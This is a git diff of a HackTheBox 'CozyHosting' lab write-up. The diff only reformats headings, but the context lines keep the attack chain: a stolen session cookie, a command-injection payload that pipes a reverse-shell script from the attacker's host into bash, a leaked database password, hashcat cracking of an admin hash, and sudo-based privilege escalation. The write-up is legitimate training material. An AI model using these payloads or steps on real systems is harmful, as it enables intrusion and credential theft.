@@ -8,14 +8,14 @@ tags: ["ctf", "penetration testing", "htb", "cybersecurity", "cozyhosting", "htb
 OS: Linux
 Difficulty : Easy
 
-# Enumeration
+## Enumeration
 
 > - One of the links on the website gives `Whitelabel Error Page`. Searching for this error gives that it is running spring boot. 
 - Brute-forcing directories with a spring boot wordlist shows directories. 
 - Navigating to one of them `/sessions` provides a session cookie for user `kanderson`. 
 - Saving the cookie and navigating to `/admin` outputs dashboard with input fields that are vulnerable to command injection.
 
-## 80-HTTP
+### 80-HTTP
 
 ![screenshot](/assets/images/cozyhosting1.png)
 
@@ -31,7 +31,7 @@ Difficulty : Easy
 
 > The web application is using spring boot
 
-### Gobuster
+#### Gobuster
 
 Using spring boot wordlist
 
@@ -104,13 +104,13 @@ Copy and save to cozyhosting.htb (not `/login`)
 
 ![screenshot](/assets/images/cozyhosting7.png)
 
-navigate to /admin
+navigate to `/admin`
 
 ![screenshot](/assets/images/cozyhosting8.png)
 
 ![screenshot](/assets/images/cozyhosting29.png)
 
-# Foothold
+## Foothold
 
 Testing for command injection in the username field. 
 Since a username field does not accept white spaces, using `${IFS}` as a delimiter.
@@ -134,7 +134,7 @@ test;curl${IFS}http://10.10.14.50/rev.sh|bash;
 
 ![screenshot](/assets/images/cozyhosting11.png)
 
-# Lateral Movement
+## Lateral Movement
 
 >- In the home directory of the user `app`, there is a zip file. 
 - Postgre database credential can be obtained from the contents of the zip file. 
@@ -151,7 +151,7 @@ unzip -d /tmp/app cloudhosting-0.0.1 jar
 spring.datasource.password = Vg&nvzAQ7XxR
 ```
 
-## Postgres
+### Postgres
 
 ```sh
 # on the target
@@ -188,19 +188,19 @@ hashcat -m 3200 admin.hash /usr/share/wordlists/rockyou.txt --force
 manchesterunited
 ```
 
-# Privilege Escalation
+## Privilege Escalation
 
 > - SSH as `josh` user with the obtained credential. 
 - `sudo -l` shows that this user has sudo privileges to run SSH. 
 - GTFOBins.
 
-## SSH as josh
+### SSH as josh
 
 ![screenshot](/assets/images/cozyhosting25.png)
 
 ![screenshot](/assets/images/cozyhosting26.png)
 
-## GTFOBins
+### GTFOBins
 
 ![screenshot](/assets/images/cozyhosting27.png)
 
